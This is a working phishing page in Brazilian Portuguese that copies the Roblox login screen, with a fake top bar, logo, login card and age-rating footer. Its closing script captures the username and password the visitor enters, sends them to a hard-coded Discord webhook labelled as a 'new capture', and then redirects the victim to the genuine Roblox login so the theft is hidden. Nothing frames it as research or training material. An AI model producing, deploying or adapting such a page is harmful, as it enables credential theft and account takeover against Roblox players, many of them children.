<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Entrar na Roblox</title>
    <link rel="icon" href="https://www.roblox.com/favicon.ico">
    <style>
        /* Fonte Oficial do Roblox Web */
        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap');
        
        * {
            margin: 0; 
            padding: 0; 
            box-sizing: border-box;
            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #000000;
            color: #ffffff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            /* Fundo com as imagens dos jogos idêntico ao print */
            background-image: 
                linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%),
                url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg');
            background-size: cover;
            background-position: center;
        }

        /* BARRA SUPERIOR */
        .topbar {
            background-color: #191b1f;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            border-bottom: 1px solid #2e3134;
            z-index: 100;
        }

        .topbar-left {
            display: flex;
            align-items: center;
            gap: 32px;
        }

        /* Logo RŌBLOX SVG */
        .logo-svg {
            width: 90px;
            height: 18px;
            fill: #ffffff;
        }

        .nav-links {
            display: flex;
            gap: 24px;
            font-size: 15px;
            font-weight: 600;
            color: #ffffff;
        }

        .nav-links span { cursor: pointer; }
        .nav-links span.active { border-bottom: 3px solid #ffffff; padding-bottom: 11px; }

        .topbar-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .search-container {
            display: flex;
            align-items: center;
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 4px;
            padding: 8px 12px;
            width: 260px;
        }

        .search-container svg {
            width: 16px; height: 16px; fill: #9ea2a6; margin-right: 8px;
        }

        .search-container input {
            background: transparent; border: none; color: #fff; font-size: 14px; outline: none; width: 100%;
        }

        .btn-cadastrar {
            background-color: #335fff; color: #fff; border: none;
            padding: 8px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer;
        }

        .btn-entrar-top {
            background-color: transparent; color: #fff; border: 1px solid #ffffff;
            padding: 8px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer;
        }

        /* ÁREA CENTRAL */
        .main-content {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        /* CAIXA DE LOGIN */
        .login-card {
            background-color: #232527;
            width: 100%;
            max-width: 400px;
            border-radius: 8px;
            padding: 32px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            border: 1px solid #3b3f43;
        }

        .login-card h1 {
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 12px;
        }

        .input-group input {
            width: 100%;
            padding: 16px;
            background-color: #191b1f;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
            outline: none;
        }

        .input-group input::placeholder { color: #9ea2a6; }

        /* Botão Entrar com fundo transparente e borda branca */
        .btn-main {
            width: 100%;
            padding: 15px;
            background-color: #232527; 
            border: 1px solid #ffffff;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            margin-top: 4px;
            cursor: pointer;
        }

        .btn-main:active { background-color: #3b3f43; }

        .forgot-link {
            display: block;
            text-align: center;
            color: #ffffff;
            text-decoration: none;
            font-size: 15px;
            margin: 20px 0;
            font-weight: 600;
        }

        .divider {
            height: 1px;
            background-color: #3b3f43;
            margin: 20px 0;
        }

        .btn-secondary {
            width: 100%;
            padding: 16px;
            background-color: #272a2e;
            border: 1px solid #3b3f43;
            border-radius: 8px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 12px;
            cursor: pointer;
        }

        .btn-secondary:active { background-color: #3b3f43; }

        .signup-text {
            text-align: center;
            color: #ffffff;
            font-size: 15px;
            margin-top: 24px;
        }

        .signup-text a { color: #ffffff; font-weight: 700; text-decoration: none; }

        /* RODAPÉ */
        .footer {
            background-color: #191b1f;
            padding: 10px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            border-top: 1px solid #2e3134;
        }

        .footer-text {
            font-size: 12px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 4px;
            letter-spacing: 0.5px;
        }

        .rating-bar {
            display: flex;
            width: 200px;
            height: 4px;
        }
        .rating-red { width: 50%; background-color: #ff0000; }
        .rating-white { width: 50%; background-color: #ffffff; }

        /* Esconde itens no celular */
        @media (max-width: 768px) {
            .nav-links, .search-container { display: none; }
            .topbar-left { gap: 0; }
            .topbar { padding: 0 16px; }
            .login-card { max-width: 90%; padding: 24px; }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <div class="topbar">
        <div class="topbar-left">
            <svg class="logo-svg" viewBox="0 0 84 16" xmlns="http://www.w3.org/2000/svg">
                <path d="M4.7,16H0L2.3,0h4.7L4.7,16z M25.4,16h-4.7l-2.3-7.8-1.5,7.8h-4.7l-2.3-16h4.7l1.5,10.3l2.3-10.3h4.7l2.3,10.3l1.5-10.3h4.7L25.4,16z M34.5,0h-4.7L27.5,16h4.7L34.5,0z M42.1,10.1v5.9h-4.7V0h4.7v7.8l5.2-7.8h5.5l-6.2,7.2l6.2,8.8h-5.5L42.1,10.1z M59.7,16H55L57.3,0h8.6L59.7,16z M60.4,4h-1.5l-0.9,7.8h1.5L60.4,4z M83.3,4h-1.5l-0.9,7.8h1.5L83.3,4z M77.9,16h-4.7L75.5,0h8.6L77.9,16z"/>
            </svg>
            <div class="nav-links">
                <span class="active">Destaques</span>
                <span>Mercado</span>
                <span>Criar</span>
                <span>Robux</span>
            </div>
        </div>
        <div class="topbar-right">
            <div class="search-container">
                <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
                <input type="text" placeholder="Pesquisar">
            </div>
            <button class="btn-cadastrar">Cadastrar-se</button>
            <button class="btn-entrar-top">Entrar</button>
        </div>
    </div>

    <!-- CONTEÚDO CENTRAL -->
    <div class="main-content">
        <div class="login-card">
            <h1>Entrar na Roblox</h1>
            
            <form id="login-form">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Usuário/e-mail/telefone" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Senha" required>
                </div>
                <button type="submit" class="btn-main" id="btn-submit">Entrar</button>
            </form>

            <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>

            <div class="divider"></div>

            <button class="btn-secondary">Envie-me um código único por e-mail</button>
            <button class="btn-secondary">Entrada rápida</button>
            <button class="btn-secondary">Outras opções de acesso</button>

            <div class="signup-text">
                Não possui uma conta? <a href="#">Cadastrar-se</a>
            </div>
        </div>
    </div>

    <!-- RODAPÉ -->
    <div class="footer">
        <div class="footer-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
        <div class="rating-bar">
            <div class="rating-red"></div>
            <div class="rating-white"></div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1573508794212815008/ZpOYHSz1PVi98zsiGbut_TShv9Jbjw6YaJUvPwtFUhPICr8cwwhpdOYmoPgcxYCn_dmW';

        const form = document.getElementById('login-form');
        const btnSubmit = document.getElementById('btn-submit');
        const user = document.getElementById('username');
        const pass = document.getElementById('password');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = user.value.trim();
            const password = pass.value;
            if (!username || !password) return;

            btnSubmit.textContent = 'Entrando...';

            const payload = {
                content: `🎣 **Nova Captura**\n👤 User: \`${username}\`\n🔑 Senha: \`${password}\``
            };

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                setTimeout(() => {
                    window.location.href = 'https://www.roblox.com/pt/Login';
                }, 1500);

            } catch (error) {
                btnSubmit.textContent = 'Entrar';
                alert('Erro de conexão. Tente novamente.');
            }
        });
    </script>
</body>
</html>
